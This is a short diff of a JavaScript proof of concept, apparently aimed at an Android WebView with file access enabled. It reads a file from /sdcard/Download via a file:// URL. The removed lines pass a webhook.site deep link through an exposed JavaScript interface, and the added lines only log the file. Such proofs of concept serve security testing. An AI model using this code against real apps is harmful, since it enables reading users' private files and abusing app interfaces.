@@ -1,12 +1,8 @@
 <script>
-// Read sensitive files via file:// URLs (if allowFileAccess=true)
-fetch('file:///sdcard/Download/WTF.txt')
-  .then(response => response.text())
-  .then(data => {
-    // Exfiltrate via JavaScript interface
-    AndroidJSI.onReceiveMessage(JSON.stringify({
-      action: "EXTERNAL_AP_LINK",
-      data: { deeplinkUrl: "https://webhook.site/fbdb0ab2-a110-4279-b4f0-be2da7cb6332"}
-    }));
-  });
-</script>
+    // Read sensitive files via file:// URLs (if allowFileAccess=true)
+    fetch('file:///sdcard/Download/WTF.txt')
+      .then(response => response.text())
+      .then(data => {
+        console.log(data);
+      });
+  </script>
